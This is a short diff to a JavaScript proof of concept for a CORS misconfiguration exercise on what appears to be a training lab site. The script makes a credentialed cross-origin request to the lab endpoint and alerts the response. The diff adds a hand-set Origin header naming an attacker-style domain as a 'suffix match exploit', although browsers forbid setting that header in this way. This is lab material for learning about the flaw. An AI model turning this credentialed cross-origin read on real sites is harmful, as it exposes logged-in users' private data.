@@ -3,9 +3,10 @@
 <script>
 var req = new XMLHttpRequest();
 req.onload = function() {
-  alert(this.responseText);
+  alert("Watchman Confirmed: " + this.responseText);
 };
 req.open('GET', 'https://labs.hacktify.in/HTML/cors_lab/lab_4/cors_4.php', true);
+req.setRequestHeader('Origin', 'http://evilhacktify.in'); // Suffix match exploit
 req.withCredentials = true; 
 req.send();
 </script>
